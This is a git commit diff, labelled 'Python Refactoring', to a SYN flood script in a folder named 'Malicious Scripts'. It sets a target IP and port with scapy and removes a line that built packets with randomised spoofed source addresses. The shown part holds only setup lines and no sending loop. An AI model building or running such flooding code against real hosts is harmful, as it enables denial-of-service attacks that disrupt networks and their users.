df0d83c40e5d7c28df3ee4d77d753a25175a27a0
Grïmą <paradoxderp65@gmail.com>
2022-01-28 09:47:46 -0600

    Python Refactoring

--- Malicious Scripts/SYNflood.py
+++ Malicious Scripts/SYNflood.py
@@ -1,12 +1,11 @@
 from scapy.all import *
 
 
+
 # Target IP (Can be a router or a specific machine), required to be manually entered as of now.
 target_ip = "192.168.1.1"
 # Target Port (Here are some common ports: 20,21=FTP, 80=HTTP, 443=HTTPS, 3389=RDP)
 target_port = 80
 
-# This creates a packet with the target IP as the destination IP address
-ip = IP(src=RandIP("192.168.1.1/24"), dst=target_ip)
 
 
